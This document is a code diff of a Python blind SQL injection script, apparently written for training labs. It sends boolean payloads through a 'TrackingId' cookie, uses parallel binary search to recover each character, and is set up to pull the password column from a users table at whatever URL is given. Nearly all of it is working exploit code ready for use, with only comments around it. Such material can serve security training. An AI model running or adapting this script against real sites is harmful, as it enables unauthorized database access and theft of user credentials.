@@ -1,85 +1,70 @@
 #!/usr/bin/python3
-import json,sys,requests, time
+import json,sys,requests,time
+from multiprocessing import Pool
+from itertools import repeat
 from urllib.parse import quote_plus
-from tabulate import tabulate
 
-target = "test"
+url = sys.argv[1]
+session = requests.Session()
 
 def oracle(query):
-    p = quote_plus(f"{target}' OR ({query})-- -")
-    r = requests.get(f"http://10.129.204.197/api/check-username.php?u={p}")
+    payload = quote_plus(f"' OR ({query})--")
+    cookies = {
+        "TrackingId": payload
+    }
+    r = requests.get(url,cookies=cookies)
     #print(request.data)
     #print(r.text)
-    j = json.loads(r.text)
-    return j['status'] == 'taken'
+    #j = json.loads(r.text)
+    #return j['status'] == 'taken'
+    return 'Welcome back!' in r.text 
 
-
-# confirm oracle can run
+# confirm oracle can run correct
 """
 assert oracle("1=1")
 assert not oracle("1=0")
 """
 
 # Calculate the Length or Count
-def dumpNumber(query):
+def dumpInteger(query):
     low = 0
     high = 127
     while low <= high:
         mid = (low+high) // 2
-        if oracle(f"({query}) BETWEEN {low} AND {mid}"):
+        if oracle(f"LEN(({query})) BETWEEN {low} AND {mid}"):
             high = mid -1
         else:
             low = mid + 1
     return low
 
+def do_binary_search_char(args):
+    condition, guess_range = args
+    left, right = guess_range
+    while right - left > 3:
+        guess = int(left + (right - left) / 2)
+        if oracle(f"({guess}>({condition}))"):
+            right = guess
+        else:
+            left = guess
+    for i in range(left, right):
+        if oracle(f"({i}=({condition}))"):
+            return i
+    return left
+
 # Dumping string
 def dumpString(query, length):
-    val = ""
-    for i in range(1, length+1):
-        c = 0
-        for p in range(7):
-            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))&{2**p}>0"):
-                c |= 2**p
-        val += chr(c)
+    conditions = [f"ASCII(SUBSTRING(({query}),{i},1))" for i in range(1, length + 1)]
+    guess_range = (32, 128)
+    params = zip(conditions, repeat(guess_range))
+    with Pool(10) as pool:
+        result = pool.map(do_binary_search_char, params)
+    val = ''.join([chr(i) for i in result])
+    print(val)
     return val
 
-
-func = int(input("""HTB_ACADEMY_ORACLE
-(1) Dump All DBs
-(2) Dump All Tables
-(3) Dump All Columns
-(4) Dump All Datas
-(5) Custom Search (Count or Length)
-(6) Custom Search (Name)
-Your Option : """))
-
-if func == 0:
-    test()
-
-elif func == 4: 
-    table = input("tables : ")
-    column = input("column : ")
-    results = []
-    for i in range(0,100):
-        row = []
-        length = (dumpNumber(f"LEN((SeLEcT {column} from {table} order by {column} offset {i} rows fetch next 1 rows only))"))
-        print(length)
-        if length == 128:
-            row.append("")
-            break
-        data = (dumpString(f"SeLEcT {column} from {table} order by {column} offset {i} rows fetch next 1 rows only",int(length)))
-        print(data)
-        row.append(data)
-        if any(row):
-            results.append(row)
-    #print(tabulate(results, headers=columns, tablefmt="grid"))
-
-elif func == 5: # sample:
-    payload = input("Payload : ")
-    print(dumpNumber(payload))
-
-elif func == 6: # sample:
-    payload = input("Payload : ")
-    length = dumpNumber(payload)
-    #string, length = payload.rsplit(maxsplit=1)
-    print(dumpString(payload,int(length)))
+table = "users" # change this
+column = "password" # change this
+payload = f"SELECT {column} FROM {table} LIMIT 1 OFFSET 0"
+length = dumpInteger(payload)
+print(length)
+value = dumpString(payload,int(length))
